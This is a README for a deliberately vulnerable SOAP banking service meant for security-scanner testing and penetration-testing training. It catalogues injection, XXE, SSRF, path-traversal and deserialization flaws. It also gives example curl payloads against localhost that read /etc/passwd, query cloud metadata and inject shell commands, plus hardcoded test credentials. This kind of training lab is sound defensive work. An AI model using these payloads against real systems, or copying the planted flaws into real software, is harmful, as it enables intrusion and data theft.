# Toxic SOAP - Vulnerable Web Service

A deliberately vulnerable SOAP web service designed for security scanner testing and penetration testing training. Similar to DVWA or WebGoat, but focused specifically on SOAP/XML web services.

## Prerequisites

- **Java 17** or higher
- **Maven 3.8+** (for manual build)
- **Docker & Docker Compose** (recommended)

## Features

- **15 intentional vulnerabilities** in a single unified SOAP service
- **Single WSDL endpoint** matching corporate patterns
- **Automatic WSDL generation** for easy scanner import
- **4 authentication methods** (WS-Security, HTTP Basic, Bearer Token/JWT, API Key)
- **Per-operation authorization** (PUBLIC / USER / ADMIN)
- **Interactive admin panel** with documentation, payloads, and JWT generator
- **Docker deployment** for easy setup
- **MariaDB database** with reset capability

## Quick Start

### Docker (Recommended)

```bash
# Clone and start
git clone https://github.com/CSPF-Founder/toxic-soap.git
cd toxic-soap
docker compose up -d

# Or using make
make docker-run
```

### Manual Build

```bash
mvn clean package
java -jar target/toxic-soap-1.0.0.jar
```

### Access Points

| URL | Description |
|-----|-------------|
| http://localhost:4040/admin | Admin Panel & Documentation |
| http://localhost:4040/ws/banking?wsdl | BankingPortalService WSDL (Single endpoint) |
| http://localhost:4040/health | Health Check Endpoint |

## Architecture (Corporate Pattern)

This service follows real corporate SOAP patterns with a **single WSDL** containing all operations. Authorization is enforced **per-operation**:

```
/ws/banking?wsdl   <- Single WSDL - BankingPortalService
├── getProductById()        <- PUBLIC (no auth)
├── searchProducts()        <- PUBLIC
├── parseProductXml()       <- PUBLIC
├── fetchProductImage()     <- PUBLIC
├── listAllProducts()       <- PUBLIC
├── getUserOrders()         <- USER auth required
├── getUserProfile()        <- USER auth required
├── searchUserData()        <- USER auth required
├── getFullProfile()        <- USER auth required
├── updateProfile()         <- USER auth required
├── generateReport()        <- ADMIN auth required
├── lookupEmployee()        <- ADMIN auth required
├── importData()            <- ADMIN auth required
├── executeSystemCommand()  <- ADMIN auth required
└── readConfigFile()        <- ADMIN auth required
```

## Authentication

Four authentication methods are supported. The interceptor tries them in order: WS-Security → Bearer Token → API Key → Basic Auth.

### Test Credentials

| Username | Password | Role | API Key |
|----------|----------|------|---------|
| `user` | `user123` | USER | `user-api-key-12345` |
| `admin` | `admin123` | ADMIN | `admin-api-key-67890` |
| `guest` | `guest` | GUEST | `guest-api-key-abcde` |

### Method 1: HTTP Basic Authentication

```bash
curl -u "user:user123" -X POST http://localhost:4040/ws/banking ...
```

Or with header:
```
Authorization: Basic dXNlcjp1c2VyMTIz
```

### Method 2: Bearer Token (JWT)

Generate a token from the admin panel or via API:
```bash
curl -X POST "http://localhost:4040/admin/generate-token?username=admin"
```

Use the token:
```
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

JWT tokens expire after 24 hours.

### Method 3: API Key

```
X-API-Key: admin-api-key-67890
```

### Method 4: WS-Security UsernameToken

```xml
<soapenv:Header>
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
        <wsse:UsernameToken>
            <wsse:Username>user</wsse:Username>
            <wsse:Password>user123</wsse:Password>
        </wsse:UsernameToken>
    </wsse:Security>
</soapenv:Header>
```

## Vulnerability Reference

### Public Operations (No Authentication)

| Vulnerability | Method | Description | OWASP |
|--------------|--------|-------------|-------|
| **SQL Injection** | `getProductById(productId)` | ID directly concatenated into SQL query | A03:2021 |
| **XXE Injection** | `searchProducts(xmlQuery)` | XML parsing without disabling external entities | A05:2021 |
| **XML Bomb (DoS)** | `parseProductXml(productXml)` | No entity expansion limits | A05:2021 |
| **SSRF** | `fetchProductImage(imageUrl)` | Arbitrary URL fetching without validation | A10:2021 |
| **Information Disclosure** | All methods | Full stack traces in SOAP faults | A01:2021 |

### User Operations (Authentication Required)

| Vulnerability | Method | Description | OWASP |
|--------------|--------|-------------|-------|
| **SQL Injection** | `getUserOrders(searchQuery)` | Search query interpolated into SQL | A03:2021 |
| **IDOR** | `getUserProfile(userId)` | Access any user's profile by ID | A01:2021 |
| **XPath Injection** | `searchUserData(xpathQuery)` | User input in XPath query | A03:2021 |
| **Sensitive Data Exposure** | `getFullProfile()` | Returns password, SSN, credit card | A02:2021 |
| **SQL Injection** | `updateProfile(userData)` | XML-parsed data in SQL | A03:2021 |

### Admin Operations (Admin Role Required)

| Vulnerability | Method | Description | OWASP |
|--------------|--------|-------------|-------|
| **Command Injection** | `generateReport(reportFormat)` | Input passed to `Runtime.exec()` | A03:2021 |
| **Command Injection** | `executeSystemCommand(command)` | Direct command execution | A03:2021 |
| **Path Traversal** | `readConfigFile(filePath)` | Arbitrary file read | A01:2021 |
| **Insecure Deserialization** | `importData(serializedData)` | Java object deserialization | A08:2021 |
| **LDAP Injection** | `lookupEmployee(ldapFilter)` | LDAP filter injection | A03:2021 |

## Example Payloads

### SQL Injection (Public - No Auth)

```bash
curl -X POST http://localhost:4040/ws/banking \
  -H "Content-Type: text/xml" \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:bank="http://toxicsoap.com/banking">
   <soapenv:Body>
      <bank:getProductById>
         <productId>1 OR 1=1--</productId>
      </bank:getProductById>
   </soapenv:Body>
</soapenv:Envelope>'
```

### XXE Injection - File Read (Public - No Auth)

```bash
curl -X POST http://localhost:4040/ws/banking \
  -H "Content-Type: text/xml" \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:bank="http://toxicsoap.com/banking">
   <soapenv:Body>
      <bank:searchProducts>
         <xmlQuery><![CDATA[<?xml version="1.0"?>
<!DOCTYPE query [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<query>
  <category>&xxe;</category>
</query>]]></xmlQuery>
      </bank:searchProducts>
   </soapenv:Body>
</soapenv:Envelope>'
```

### SSRF - Internal Network Scan (Public - No Auth)

```bash
curl -X POST http://localhost:4040/ws/banking \
  -H "Content-Type: text/xml" \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:bank="http://toxicsoap.com/banking">
   <soapenv:Body>
      <bank:fetchProductImage>
         <imageUrl>http://169.254.169.254/latest/meta-data/</imageUrl>
      </bank:fetchProductImage>
   </soapenv:Body>
</soapenv:Envelope>'
```

### Sensitive Data Exposure (User Auth Required)

```bash
curl -X POST http://localhost:4040/ws/banking \
  -H "Content-Type: text/xml" \
  -u "user:user123" \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:bank="http://toxicsoap.com/banking">
   <soapenv:Body>
      <bank:getFullProfile/>
   </soapenv:Body>
</soapenv:Envelope>'
```

### Command Injection (Admin Auth Required)

```bash
curl -X POST http://localhost:4040/ws/banking \
  -H "Content-Type: text/xml" \
  -u "admin:admin123" \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:bank="http://toxicsoap.com/banking">
   <soapenv:Body>
      <bank:generateReport>
         <reportFormat>pdf; cat /etc/passwd</reportFormat>
      </bank:generateReport>
   </soapenv:Body>
</soapenv:Envelope>'
```

### Path Traversal (Admin Auth Required)

```bash
curl -X POST http://localhost:4040/ws/banking \
  -H "Content-Type: text/xml" \
  -u "admin:admin123" \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:bank="http://toxicsoap.com/banking">
   <soapenv:Body>
      <bank:readConfigFile>
         <filePath>../../../etc/passwd</filePath>
      </bank:readConfigFile>
   </soapenv:Body>
</soapenv:Envelope>'
```

## Scanner Configuration

### Burp Suite

1. **Import WSDL**: Target > Site map > Right-click > "Parse WSDL"
   - URL: `http://localhost:4040/ws/banking?wsdl`
2. **Configure Auth**: Project options > Sessions > Add session handling rule
   - Add header: `Authorization: Basic dXNlcjp1c2VyMTIz`
3. **Scan**: Right-click endpoint > "Actively scan"

### OWASP ZAP

1. **Import WSDL**: Sites > Import > Import WSDL from URL
   - URL: `http://localhost:4040/ws/banking?wsdl`
2. **Set Context**: Include `http://localhost:4040/ws/.*`
3. **Authentication**: HTTP/NTLM Auth with `user`/`user123`
4. **Active Scan**: Right-click context > Active Scan

### SoapUI / ReadyAPI

1. Create new SOAP project from WSDL: `http://localhost:4040/ws/banking?wsdl`
2. Configure WS-Security:
   - Outgoing WS-Security Configurations > Add Username Token
   - Username: `user`, Password: `user123`
3. Run Security Scan on each operation

### Nuclei

```yaml
id: toxic-soap-sqli
info:
  name: Toxic SOAP SQL Injection
  severity: critical

http:
  - raw:
      - |
        POST /ws/banking HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:bank="http://toxicsoap.com/banking">
          <soapenv:Body>
            <bank:getProductById>
              <productId>1' OR '1'='1</productId>
            </bank:getProductById>
          </soapenv:Body>
        </soapenv:Envelope>

    matchers:
      - type: word
        words:
          - "Laptop Pro"
```

## Project Structure

```
toxic_soap/
├── src/main/java/com/toxicsoap/
│   ├── ToxicSoapApplication.java         # Entry point
│   ├── config/
│   │   ├── CxfConfig.java                # SOAP endpoint registration
│   │   └── AuthProperties.java           # Auth configuration binding
│   ├── interceptor/
│   │   └── AuthInterceptor.java          # 4 auth methods handler
│   ├── model/
│   │   ├── Product.java
│   │   ├── User.java
│   │   ├── Order.java
│   │   └── AuthContext.java
│   ├── service/
│   │   ├── BankingPortalService.java     # Unified service interface
│   │   ├── BankingPortalServiceImpl.java # All vulnerable operations
│   │   └── JwtService.java               # JWT token generation/validation
│   └── web/
│       └── AdminPanelController.java     # Web admin panel + token endpoint
├── src/main/resources/
│   ├── application.yml                   # Configuration
│   ├── data.sql                          # Sample data
│   └── templates/
│       └── admin.html                    # Admin panel UI
├── Dockerfile
├── docker-compose.yml
├── Makefile
└── pom.xml
```

## Technology Stack

- **Java 17** - LTS version
- **Spring Boot 3.2** - Application framework
- **Apache CXF 4.0** - SOAP/WSDL framework
- **MariaDB** - Database
- **JJWT** - JWT token handling
- **Thymeleaf** - Admin panel templating
- **Docker** - Containerization

## Makefile Commands

```bash
make build        # Build with Maven
make run          # Run locally
make test         # Run tests
make clean        # Clean build artifacts
make docker-build # Build Docker image
make docker-run   # Run with Docker Compose
make docker-stop  # Stop containers
```

## Database

The application uses MariaDB. When running with Docker Compose, the database is automatically configured.

### Connection Details (Docker)

- Host: `mariadb` (internal) / `localhost:3306` (external)
- Database: `toxicdb`
- Username: `toxic`
- Password: `toxic123`

### Reset Database

Use the admin panel or call:
```bash
curl -X POST http://localhost:4040/admin/reset
```

## Disclaimer

**This application is intentionally vulnerable.**

It is designed for:
- Security scanner testing and validation
- Penetration testing training
- Security research and education

**DO NOT:**
- Deploy in production environments
- Expose to untrusted networks
- Use for malicious purposes

## License

MIT License - Use at your own risk for authorized testing only.
